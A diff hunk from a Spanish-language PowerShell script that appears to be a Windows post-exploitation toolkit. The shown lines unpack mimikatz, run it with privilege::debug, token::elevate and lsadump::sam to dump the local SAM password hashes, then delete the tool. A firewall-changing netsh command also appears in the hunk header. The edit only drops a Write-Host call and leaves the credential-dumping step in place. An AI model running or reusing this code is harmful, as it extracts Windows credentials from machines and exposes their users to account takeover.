@@ -160,7 +160,7 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
-        Write-Host "" ; powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit 
+        powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit 
         Write-Host "" ; pause ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }}
         if($module -like '2') { $console ="true" ; Write-Host "Módulo cargado con éxito!" -ForegroundColor Green }
         if($module -in '1','2') { $null }
